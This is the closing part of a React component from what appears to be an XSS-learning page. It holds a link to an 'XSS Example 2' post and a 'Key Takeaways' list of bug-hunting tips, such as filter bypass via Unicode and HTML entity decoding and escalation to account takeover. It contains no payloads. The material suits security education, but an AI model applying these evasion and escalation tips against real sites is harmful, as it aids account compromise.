                <a href="https://x.com/YShahinzadeh/status/1561384031836569600" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                  @YShahinzadeh XSS Example 2 <ExternalLink className="w-3 h-3" />
                </a>
              </li>
            </ul>
          </div>

          {/* Recap */}
          <div className="bg-gradient-to-r from-primary-500/10 to-cyan-500/10 rounded-xl border border-primary-500/30 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <Lightbulb className="w-5 h-5 text-yellow-400" />
              Key Takeaways
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {[
                'If reflected value not in source code → DOM XSS',
                'Enhance payload gently, step by step',
                'Replacement after ruleset is a KILLER',
                'Unicode works in JavaScript codes',
                'HTML encoding auto-decoded in attributes',
                'Dangerous sinks need user input to be vulnerable',
                'Setup your own test-bed for payloads',
                'XSS is not related to Content-Type',
                'Increase severity with ATO when possible',
                'Fuzzing is your friend, do not drop it',
                'Debug JS for XSS and other bug types',
                'Tools do not make hackers, hackers make tools',
              ].map((tip, index) => (
                <div key={index} className="flex items-start gap-2 text-sm text-slate-300">
                  <span className="text-primary-400 flex-shrink-0">✓</span>
                  <span>{tip}</span>
                </div>
              ))}
            </div>
          </div>
        </motion.div>
      )}
    </div>
  );
}
